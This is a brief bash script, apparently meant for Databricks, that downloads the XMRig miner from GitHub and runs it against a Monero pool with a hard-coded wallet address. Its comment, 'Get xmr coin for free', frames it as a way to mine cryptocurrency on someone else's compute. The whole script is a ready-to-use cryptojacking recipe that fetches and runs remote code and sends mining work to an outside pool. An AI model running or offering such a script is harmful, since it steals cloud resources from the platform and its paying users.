#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 87RXucprYBtWw3PAGiMzqgjKpVoPChy1yhk1MTQo5Pv5ZcRXfrV9Yz6H8WCwByjjxGenhP6NVcv94iwWeTQg947FSaGyE6b  -k --tls --rig-id aank
